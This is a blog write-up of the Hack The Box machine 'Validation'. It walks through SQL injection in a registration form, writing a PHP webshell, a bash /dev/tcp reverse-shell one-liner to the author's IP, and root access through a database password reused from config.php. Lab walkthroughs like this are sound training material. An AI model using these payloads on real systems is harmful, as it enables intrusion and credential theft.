@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Validation :: Terminal</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="**HTB | Validation - Write up**" />
+<meta name="keywords" content=", " />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://theloganlab.github.io/posts/validation/" />
+
+
+
+
+<link rel="stylesheet" href="https://theloganlab.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://theloganlab.github.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://theloganlab.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://theloganlab.github.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="l0gan334" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Validation">
+<meta property="og:description" content="**HTB | Validation - Write up**" />
+<meta property="og:url" content="https://theloganlab.github.io/posts/validation/" />
+<meta property="og:site_name" content="Terminal" />
+
+  <meta property="og:image" content="https://theloganlab.github.io/Validation.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-06-22 21:03:46 -0500 -05" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://theloganlab.github.io/posts/validation/">Validation</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-06-22
+        
+      </span>
+    
+    
+      <span class="post-author">:: l0gan334</span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://theloganlab.github.io/tags/hacking/">hacking</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/ctf/">ctf</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/htb/">HTB</a>&nbsp;
+    
+  </span>
+  
+  
+  <img src="https://theloganlab.github.io/Validation.png"
+    class="post-cover"
+    alt="Validation"
+    title="Cover Image" />
+
+
+  
+
+  <div class="post-content"><div>
+        <p><strong>Validation</strong> is a Hack The Box machine ranked easy.</p>
+<p>Its main challenge is <strong>SQL Injection</strong> where we&rsquo;re going to be able to write a <strong>webshell</strong> into the web server.</p>
+<h1 id="nmap-scan">Nmap scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>With <strong>nmap</strong> we will find opened ports and examinate them:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- -sS --min-rate <span style="color:#ae81ff">5000</span> --open -n -Pn 10.129.84.93 -oG allPorts
+</span></span></code></pre></div><p>We are exporting the result in grepable format, which is great to manage with regex and get all the ports without needing to type them one by one:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox"  />
+    <label for="1">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">Here you have an useful function you can use for this manner</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-bash" ><code>
+extractPorts () {
+	ports=&#34;$(cat $1 | grep -oP &#39;\d{1,5}/open&#39; | awk &#39;{print $1}&#39; FS=&#39;/&#39; | xargs | tr &#39; &#39; &#39;,&#39;)&#34;
+	ip_address=&#34;$(cat $1 | grep initiated | awk &#39;NF{print $NF}&#39;)&#34;
+	echo -e &#34;\n[*] Extracting information...\n&#34; &gt; extractPorts.tmp
+	echo -e &#34;\t[*] IP Address: $ip_address&#34; &gt;&gt; extractPorts.tmp
+	echo -e &#34;\t[*] Open ports: $ports\n&#34; &gt;&gt; extractPorts.tmp
+	echo $ports | tr -d &#39;\n&#39; | xclip -sel clip
+	echo -e &#34;[*] Ports copied to clipboard\n&#34; &gt;&gt; extractPorts.tmp
+	/bin/batcat extractPorts.tmp
+	rm extractPorts.tmp
+}
+</code></pre>
+  </div>
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ extractPorts allPorts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting information...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> IP Address: 10.129.84.93
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Open ports: 22,80,4566,8080
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ports copied to clipboard
+</span></span></code></pre></div><p>Now that we have the opened ports we can examinate them deeply.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 22,80,4566.8080 -oN targeted
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-06-23 12:55 -05
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.84.93
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.48 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>UTF-8<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.48 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>4566/tcp open  http    nginx
+</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">403</span> Forbidden
+</span></span><span style="display:flex;"><span>8080/tcp open  http    nginx
+</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">502</span> Bad Gateway
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 17.98 seconds
+</span></span></code></pre></div><p><strong>Port 80</strong> is opened with a <strong>http</strong> service, we can make a quick inspection with <strong>whatweb</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ whatweb http://10.129.85.93
+</span></span><span style="display:flex;"><span>http://10.129.84.93 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.48<span style="color:#f92672">]</span>, Bootstrap, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Debian Linux<span style="color:#f92672">][</span>Apache/2.4.48 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)]</span>,
+</span></span><span style="display:flex;"><span>IP<span style="color:#f92672">[</span>10.129.84.93<span style="color:#f92672">]</span>, JQuery, PHP<span style="color:#f92672">[</span>7.4.23<span style="color:#f92672">]</span>, Script, X-Powered-By<span style="color:#f92672">[</span>PHP/7.4.23<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>We don&rsquo;t get much information so it&rsquo;s time to visit the page:</p>
+
+  <img src="/img/sc3.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>It&rsquo;s a register panel that doesn&rsquo;t seem to do much&hellip;</p>
+
+  <img src="/img/test.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>We will intercept the register request with <strong>Burpsuite</strong> so we can do some tests.
+
+  <img src="/img/val-2.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>After a simple test we see how the <em>country</em> field is vulnerable to <strong>SQLI</strong>:
+
+  <img src="/img/val-1.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>We could look for credentials in the dabatase but we can also check if we can write files:
+
+  <img src="/img/val-3.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>We will test this by writing &ldquo;test&rdquo; into /var/www/html/test.txt which is the default route where the website files are located:
+
+  <img src="/img/val-4.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>And it works!</p>
+<p><strong>Wappalyzer</strong> shows us the programming language used by the website:
+
+  <img src="/img/val-5.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>So now we can write a simple web shell in <strong>php</strong> and get <strong>Remote Command Execution.</strong>
+
+  <img src="/img/val-6.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>This script will create a <strong>webshell</strong> in <strong>/shell.php</strong> which takes the parameter <strong>cmd</strong> to execute commands:
+
+  <img src="/img/val-7.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>Now we can get a reverse shell with this payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.161/334 0&gt;&amp;1&#39;</span>
+</span></span></code></pre></div><p>Here we specify our <strong>IP address</strong> and the <strong>port</strong> where we&rsquo;re going to set the listener.</p>
+<p>As we are sending this payload over <strong>URL</strong> the <strong>&rsquo;&amp;&rsquo;</strong> might give us syntax problems so we will url-encode this character as <strong>%26</strong>:
+
+  <img src="/img/val-9.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>Now we check our listener and we wait for the connection:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>Ncat: Version 7.92 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Ncat: Listening on :::334
+</span></span><span style="display:flex;"><span>Ncat: Listening on 0.0.0.0:334
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.83.187.
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.83.187:46728.
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>www-data@validation:/var/www/html$
+</span></span></code></pre></div><p>We have a shell but not a <strong>tty</strong> so we will do a <strong>tty treatment</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@validation:/var/www/html$ script /dev/null -c bash
+</span></span><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>Script started, output log file is <span style="color:#e6db74">&#39;/dev/null&#39;</span>.
+</span></span><span style="display:flex;"><span>www-data@validation:/var/www/html$ ^Z
+</span></span><span style="display:flex;"><span>zsh: suspended  nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ stty raw -echo; fg
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + continued  nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>                              reset
+</span></span><span style="display:flex;"><span>reset: unknown terminal type unknown
+</span></span><span style="display:flex;"><span>Terminal type? xterm
+</span></span></code></pre></div><p>And finally the last touches.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@validation:/var/www/html$ export SHELL<span style="color:#f92672">=</span>bash
+</span></span><span style="display:flex;"><span>www-data@validation:/var/www/html$ export TERM<span style="color:#f92672">=</span>xterm
+</span></span><span style="display:flex;"><span>www-data@validation:/var/www/html$ stty rows <span style="color:#ae81ff">40</span> columns <span style="color:#ae81ff">45</span>
+</span></span></code></pre></div><p>This way we will have the correct screen size (you can find your own with <code>stty size</code>) and we are also able to do ^L.</p>
+<p>Now that we have everything set we look for the <strong>user flag</strong> and start the enumeration:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@validation:/var/www/html$ cd /home
+</span></span><span style="display:flex;"><span>www-data@validation:/home$ ls
+</span></span><span style="display:flex;"><span>htb
+</span></span><span style="display:flex;"><span>www-data@validation:/home$ cd htb
+</span></span><span style="display:flex;"><span>www-data@validation:/home/htb$ cat user.txt
+</span></span><span style="display:flex;"><span>18ed73a646e875a23aaaa1**********
+</span></span></code></pre></div><p>Nice, we found the <strong>user.txt</strong> now we can move on.</p>
+<p>Inside <strong>/var/www/html</strong> we find this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@validation:/var/www/html$ ls
+</span></span><span style="display:flex;"><span>account.php  config.php  css  index.php  js
+</span></span></code></pre></div><p>There&rsquo;s a configuration file, which are usually very interesting and might contain credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@validation:/var/www/html$ cat config.php
+</span></span><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span>  $servername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>;
+</span></span><span style="display:flex;"><span>  $username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uhc&#34;</span>;
+</span></span><span style="display:flex;"><span>  $password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uhc-9qual-global-pw&#34;</span>;
+</span></span><span style="display:flex;"><span>  $dbname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;registration&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  $conn <span style="color:#f92672">=</span> new mysqli<span style="color:#f92672">(</span>$servername, $username, $password, $dbname<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>?&gt;
+</span></span></code></pre></div><p>These are supposed to be <strong>database</strong> credentials, however, we have to check if they&rsquo;re being reused by any user inside the machine, like <strong>root</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>www-data@validation:/var/www/html$ su root
+</span></span><span style="display:flex;"><span>Password:  
+</span></span><span style="display:flex;"><span>root@validation:/var/www/html# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>And it is! Not a hard privilege escalation this time.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@validation:/var/www/html# cat /root/root.txt
+</span></span><span style="display:flex;"><span>8e1b95544267b95044**************
+</span></span></code></pre></div><p>See you next time!</p>
+
+      </div></div>
+
+  
+  
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      </div>
+  </div>
+</footer>
+
+<script src="https://theloganlab.github.io/assets/main.js"></script>
+<script src="https://theloganlab.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
